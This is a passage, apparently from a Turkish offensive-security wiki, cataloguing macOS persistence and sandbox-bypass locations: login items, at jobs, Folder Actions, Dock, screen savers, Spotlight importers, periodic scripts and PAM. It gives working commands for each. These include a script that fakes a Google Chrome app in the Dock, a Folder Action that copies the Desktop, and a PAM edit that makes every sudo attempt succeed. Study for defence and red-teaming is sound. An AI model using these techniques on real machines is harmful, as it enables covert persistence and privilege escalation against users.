Bunları komut satırından listelemek, eklemek ve kaldırmak mümkündür:<sup>[[15]](#references)</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Bu öğeler **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** dosyasında saklanır.

**Login items**, [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) API'si kullanılarak da belirtilebilir; bu API yapılandırmayı **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** içinde saklar.

### ZIP as Login Item

(Login Items hakkındaki önceki bölüme bakın; bu bölüm onun bir uzantısıdır)

Bir **ZIP** dosyasını **Login Item** olarak saklarsanız, **`Archive Utility`** dosyayı açar. ZIP örneğin **`~/Library`** içinde saklanmış ve içinde backdoor içeren **`LaunchAgents/file.plist`** klasörü bulunuyorsa, bu klasör oluşturulur (varsayılan olarak mevcut değildir) ve plist eklenir. Böylece kullanıcı bir sonraki oturum açışında, plist içinde belirtilen **backdoor çalıştırılır**.

Başka bir seçenek de kullanıcı HOME dizini içinde **`.bash_profile`** ve **`.zshenv`** dosyalarını oluşturmaktır. Böylece LaunchAgents klasörü zaten mevcutsa bu technique yine çalışır.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak **`at`** komutunu **çalıştırmanız** gerekir ve **etkinleştirilmiş** olmalıdır
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`** komutunu **çalıştırmanız** gerekir ve **etkinleştirilmiş** olmalıdır

#### **Description**

`at` görevleri, belirli zamanlarda yürütülecek **tek seferlik görevleri zamanlamak** için tasarlanmıştır. `at` görevleri, cron job'larının aksine, çalıştırıldıktan sonra otomatik olarak kaldırılır. Bu görevlerin sistem yeniden başlatmaları arasında kalıcı olduğunu ve belirli koşullar altında potansiyel security concern oluşturduğunu belirtmek önemlidir.<sup>[[16]](#references)</sup>

**Varsayılan olarak** bunlar **devre dışıdır**, ancak **root** kullanıcısı bunları şu komutla **etkinleştirebilir**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Bu, 1 saat içinde bir dosya oluşturacak:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
İş kuyruğunu `atq` kullanarak kontrol edin:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Yukarıda zamanlanmış iki iş görebiliriz. İşin ayrıntılarını `at -c JOBNUMBER` kullanarak yazdırabiliriz.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> AT tasks etkin değilse oluşturulan görevler yürütülmez.

**job files** `/private/var/at/jobs/` konumunda bulunabilir.
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Dosya adı kuyruğu, job numarasını ve çalışmasının zamanlandığı zamanı içerir. Örnek olarak `a0001a019bdcd2` değerine bakalım.

- `a` - kuyruktur
- `0001a` - hex biçiminde job numarasıdır; `0x1a = 26`
- `019bdcd2` - hex biçiminde zamandır. Epoch'tan bu yana geçen dakikaları temsil eder. `0x019bdcd2`, ondalık sistemde `26991826` değerine karşılık gelir. Bunu 60 ile çarparsak `1619509560` elde ederiz. Bu da `GMT: 2021. April 27., Tuesday 7:46:00` zamanına karşılık gelir.

Job dosyasını yazdırırsak, `at -c` kullanarak elde ettiğimiz bilgilerin aynısını içerdiğini görürüz.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Sandbox bypass için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak Folder Actions'ı yapılandırabilmek için **`System Events`** ile iletişim kuracak şekilde `osascript`'i argümanlarla çağırabilmeniz gerekir
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop, Documents ve Downloads gibi bazı temel TCC izinlerine sahiptir

#### Konum

- **`/Library/Scripts/Folder Action Scripts`**
- Root gereklidir
- **Tetikleyici**: Belirtilen klasöre erişim
- **`~/Library/Scripts/Folder Action Scripts`**
- **Tetikleyici**: Belirtilen klasöre erişim

#### Açıklama ve Exploitation

Folder Actions; öğelerin eklenmesi veya kaldırılması ya da klasör penceresinin açılması veya yeniden boyutlandırılması gibi bir klasördeki değişiklikler tarafından otomatik olarak tetiklenen script'lerdir. Bu actions çeşitli görevler için kullanılabilir ve Finder UI veya terminal komutları kullanılarak farklı şekillerde tetiklenebilir.<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions'ı ayarlamak için şu seçeneklere sahipsiniz:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Folder Action workflow'u oluşturmak ve bunu bir service olarak yüklemek.
2. Bir klasörün context menu'sündeki Folder Actions Setup üzerinden bir script'i manuel olarak ilişkilendirmek.
3. Bir Folder Action'ı programatik olarak ayarlamak üzere `System Events.app`'e Apple Event mesajları göndermek için OSAScript kullanmak.
- Bu method, action'ı sisteme gömmek ve bir kalıcılık düzeyi sağlamak için özellikle kullanışlıdır.

Aşağıdaki script, bir Folder Action tarafından çalıştırılabilecek bir örnektir:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Yukarıdaki script'i Folder Actions tarafından kullanılabilir hâle getirmek için şu komutla derleyin:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Script derlendikten sonra, aşağıdaki scripti çalıştırarak Folder Actions'ı ayarlayın. Bu script, Folder Actions'ı global olarak etkinleştirir ve daha önce derlenen scripti özellikle Desktop klasörüne bağlar.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Kurulum script'ini şu komutla çalıştırın:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Bu, bu kalıcılığı GUI aracılığıyla uygulamanın yoludur:

Yürütülecek script şudur:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Şununla derleyin: `osacompile -l JavaScript -o folder.scpt source.js`

Şuraya taşıyın:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Ardından `Folder Actions Setup` uygulamasını açın, **izlemek istediğiniz klasörü** seçin ve kendi durumunuzda **`folder.scpt`** dosyasını seçin (benim durumumda dosyaya output2.scp adını verdim):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Şimdi bu klasörü **Finder** ile açarsanız script'iniz çalıştırılır.

Bu yapılandırma, base64 formatında **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** konumundaki **plist** dosyasında saklandı.

Şimdi bu persistence'ı GUI erişimi olmadan hazırlamayı deneyelim:

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dosyasını yedeklemek için `/tmp` konumuna **kopyalayın**:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. Az önce ayarladığınız Folder Actions'ı **kaldırın**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Artık boş bir ortamımız olduğuna göre

3. Yedek dosyayı kopyalayın: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Bu yapılandırmayı kullanması için Folder Actions Setup.app'i açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Bu bende çalışmadı, ancak writeup'taki talimatlar şunlar:(

### Dock kısayolları

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- sandbox'ı bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak sistemin içine malicious bir application yüklemiş olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Kullanıcı Dock içindeki uygulamaya tıkladığında

#### Açıklama ve Exploitation

Dock'ta görünen tüm applications şu plist dosyasında belirtilir: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Şu komutla yalnızca bir **application eklemek** mümkündür:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Bir miktar **social engineering** kullanarak Dock içinde **örneğin Google Chrome'u taklit edebilir** ve aslında kendi script'inizi çalıştırabilirsiniz:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Renk Seçiciler

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Çok belirli bir eylemin gerçekleşmesi gerekir
- Başka bir sandbox içinde sonlanırsınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/Library/ColorPickers`
- Root gereklidir
- Tetikleyici: Renk seçiciyi kullanma
- `~/Library/ColorPickers`
- Tetikleyici: Renk seçiciyi kullanma

#### Açıklama ve Exploit

Kodunuzu içeren bir color picker bundle'ı **derleyin** (örneğin [**bunu kullanabilirsiniz**](https://github.com/viktorstrate/color-picker-plus)) ve bir constructor ekleyin ([Screen Saver bölümündeki](macos-auto-start-locations.md#screen-saver) gibi), ardından bundle'ı `~/Library/ColorPickers` konumuna kopyalayın.<sup>[[20]](#references)</sup>

Ardından, color picker tetiklendiğinde bundle'ınız da çalışmalıdır.

Kitaplığınızı yükleyen binary'nin **çok kısıtlayıcı bir sandbox** kullandığını unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- sandbox bypass için kullanışlı: **Hayır, çünkü kendi uygulamanızı çalıştırmanız gerekir**
- TCC bypass: ???

#### Konum

- Belirli bir uygulama

#### Açıklama ve Exploit

Finder Sync Extension içeren bir uygulama [**burada bulunabilir**](https://github.com/D00MFist/InSync).

Uygulamalarda `Finder Sync Extensions` bulunabilir. Bu extension, çalıştırılacak bir uygulamanın içine yerleştirilir. Ayrıca extension'ın kodunu çalıştırabilmesi için **geçerli bir Apple developer certificate ile imzalanmış** olması, **sandboxed** olması (her ne kadar daha esnek istisnalar eklenebilse de) ve aşağıdakine benzer bir şeyle kaydedilmiş olması gerekir:<sup>[[21]](#references)[[22]](#references)</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Ekran Koruyucu

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak sonunda ortak bir uygulama sandbox'ında olursunuz
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/System/Library/Screen Savers`
- Root gereklidir
- **Tetikleyici**: Ekran koruyucuyu seçin
- `/Library/Screen Savers`
- Root gereklidir
- **Tetikleyici**: Ekran koruyucuyu seçin
- `~/Library/Screen Savers`
- **Tetikleyici**: Ekran koruyucuyu seçin

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Açıklama ve Exploit

Xcode'da yeni bir proje oluşturun ve yeni bir **Screen Saver** oluşturmak için şablonu seçin. Ardından kodunuzu ekleyin; örneğin aşağıdaki kod loglar oluşturur.<sup>[[23]](#references)[[24]](#references)</sup>

**Build** işlemini gerçekleştirin ve `.saver` bundle'ını **`~/Library/Screen Savers`** konumuna kopyalayın. Ardından Screen Saver GUI'sini açın ve üzerine tıklamanız yeterlidir; çok sayıda log oluşturmalıdır:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Bu kodu yükleyen binary'nin (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) entitlements'ları içinde **`com.apple.security.app-sandbox`** bulunduğundan, **ortak uygulama sandbox'ının içinde olacağınızı** unutmayın.

Ekran koruyucu kodu:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak bir application sandbox içinde kalırsınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Sandbox oldukça kısıtlı görünüyor

#### Konum

- `~/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- `/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- Root gerekir
- `/System/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- Root gerekir
- `Some.app/Contents/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- Yeni bir app gerekir

#### Açıklama ve Exploitation

Spotlight, kullanıcılara **bilgisayarlarındaki verilere hızlı ve kapsamlı erişim** sağlamak üzere tasarlanmış, macOS'un yerleşik arama özelliğidir.\
Bu hızlı arama özelliğini desteklemek için Spotlight, **özel bir veritabanı** tutar ve **çoğu dosyayı ayrıştırarak** bir index oluşturur; böylece hem dosya adlarında hem de dosya içeriklerinde hızlı arama yapılabilir.<sup>[[25]](#references)</sup>

Spotlight'ın temel mekanizmasında, **'metadata server'** anlamına gelen 'mds' adlı merkezi bir process bulunur. Bu process, Spotlight servisinin tamamını yönetir. Buna ek olarak, farklı dosya türlerini indexlemek gibi çeşitli bakım görevlerini gerçekleştiren birden fazla 'mdworker' daemon'ı bulunur (`ps -ef | grep mdworker`). Bu görevler, Spotlight importer plugin'leri veya Spotlight'ın çok çeşitli dosya formatlarındaki içeriği anlamasını ve indexlemesini sağlayan **".mdimporter bundles**" aracılığıyla gerçekleştirilir.

Plugin'ler veya **`.mdimporter`** bundle'ları daha önce belirtilen konumlarda bulunur ve yeni bir bundle ortaya çıktığında bir dakika içinde yüklenir (herhangi bir servisi yeniden başlatmaya gerek yoktur). Bu bundle'ların **hangi dosya türlerini ve uzantılarını yönetebildiklerini** belirtmesi gerekir; bu sayede Spotlight, belirtilen uzantıya sahip yeni bir dosya oluşturulduğunda bunları kullanır.

Yüklü durumdaki tüm `mdimporters`'ı şu şekilde **bulmak** mümkündür:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Örneğin **/Library/Spotlight/iBooksAuthor.mdimporter**, bu tür dosyaları (diğerlerinin yanı sıra `.iba` ve `.book` uzantılı dosyaları) ayrıştırmak için kullanılır:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Diğer `mdimporter`'ların Plist'ini kontrol ederseniz **`UTTypeConformsTo`** girdisini bulamayabilirsiniz. Bunun nedeni bunun yerleşik bir _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) olması ve uzantıları belirtmesine gerek olmamasıdır.
>
> Ayrıca System varsayılan plugin'leri her zaman önceliklidir; bu nedenle bir attacker yalnızca Apple'ın kendi `mdimporters`'ı tarafından başka şekilde indexlenmeyen dosyalara erişebilir.

Kendi importer'ınızı oluşturmak için şu project ile başlayabilirsiniz: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer). Ardından adı, **`CFBundleDocumentTypes`** değerini değiştirin ve desteklemek istediğiniz extension'ı desteklemesi için **`UTImportedTypeDeclarations`** ekleyin; bunları **`schema.xml`** dosyasına yansıtın.\
Sonra **`GetMetadataForFile`** function'ının kodunu, işlenen extension'a sahip bir file oluşturulduğunda payload'ınızı çalıştıracak şekilde **değiştirin**.

Son olarak yeni `.mdimporter`'ınızı **build edip önceki üç location'dan birine kopyalayın**. Yüklendiğini **log'ları monitoring ederek** veya **`mdimport -L`** komutunu çalıştırarak kontrol edebilirsiniz.

### ~~Preference Pane~~

> [!CAUTION]
> Bunun artık çalışıyor gibi görünmediğini unutmayın.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Belirli bir user action gerektirir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Bunun artık çalışıyor gibi görünmediğini unutmayın.<sup>[[26]](#references)</sup>

## Root Sandbox Bypass

> [!TIP]
> Burada **root** olarak bir şeyleri **bir file'a yazarak** ve/veya başka **garip koşullar** gerektirerek basitçe çalıştırmanıza olanak sağlayan **sandbox bypass** için kullanışlı start location'ları bulabilirsiniz.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root gereklidir
- **Trigger**: Zamanı geldiğinde
- `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local`
- Root gereklidir
- **Trigger**: Zamanı geldiğinde

#### Description & Exploitation

Periodic script'leri (**`/etc/periodic`**), **`/System/Library/LaunchDaemons/com.apple.periodic*`** içinde yapılandırılmış **launch daemon**'lar nedeniyle execute edilir. `/etc/periodic/` içinde saklanan script'lerin file'ın **owner'ı** olarak **execute edildiğini** unutmayın; bu nedenle bu yöntem olası bir privilege escalation için çalışmaz.<sup>[[27]](#references)</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
**`/etc/defaults/periodic.conf`** içinde çalıştırılacak diğer periyodik script'ler belirtilmiştir:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
`/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarından herhangi birine yazmayı başarırsanız, bu dosya **er ya da geç çalıştırılır**.

> [!WARNING]
> Periodic script'in **script'in sahibi olarak çalıştırılacağını** unutmayın. Bu nedenle script'in sahibi normal bir kullanıcıysa, script o kullanıcı olarak çalıştırılır (bu, privilege escalation saldırılarını önleyebilir).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- Her zaman root gerekir

#### Açıklama ve Exploitation

PAM, macOS içinde kolay execution'dan ziyade **persistence** ve malware'e odaklandığından, bu blog detaylı bir açıklama sunmayacaktır; **bu tekniği daha iyi anlamak için writeup'ları okuyun**.<sup>[[28]](#references)</sup>

PAM modüllerini şununla kontrol edin:
```bash
ls -l /etc/pam.d
```
PAM'i kötüye kullanan bir persistence/privilege escalation tekniği, /etc/pam.d/sudo modülünü değiştirip başına şu satırı eklemek kadar kolaydır:
```bash
auth       sufficient     pam_permit.so
```
Yani yaklaşık olarak şöyle **görünecek**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Ve bu nedenle **`sudo` kullanma girişimleri başarılı olacaktır**.

> [!CAUTION]
> Bu dizinin TCC tarafından korunduğunu ve kullanıcının erişim izni isteyen bir istem almasının oldukça muhtemel olduğunu unutmayın.

Bir başka güzel örnek de su'dur; burada PAM modüllerine parametre vermenin de mümkün olduğunu görebilirsiniz (ayrıca bu dosyaya backdoor da yerleştirebilirsiniz):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

